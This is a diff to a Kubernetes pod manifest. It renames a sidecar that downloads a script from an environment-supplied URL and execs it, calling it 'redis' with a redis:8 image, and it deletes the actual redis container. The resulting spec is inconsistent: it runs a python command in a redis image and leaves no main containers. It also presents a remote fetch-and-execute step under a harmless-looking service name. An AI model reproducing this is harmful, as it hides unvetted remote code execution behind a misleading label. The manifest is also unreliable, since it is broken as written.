@@ -9,8 +9,8 @@ spec:
   initContainers:
     # Native sidecar (restartPolicy: Always): starts before the main container
     # and keeps running for the pod's lifetime. Requires Kubernetes >= 1.29.
-    - name: hostname-server
-      image: python:3.13-slim
+    - name: redis
+      image: redis:8
       restartPolicy: Always
       env:
         - name: SCRIPT_URL
@@ -20,12 +20,3 @@ spec:
         - |
           python -c "import os, urllib.request; urllib.request.urlretrieve(os.environ['SCRIPT_URL'], '/tmp/server.py')" \
           && exec python -u /tmp/server.py
-      ports:
-        - name: http
-          containerPort: 1337
-  containers:
-    - name: redis
-      image: redis:8
-      ports:
-        - name: redis
-          containerPort: 6379
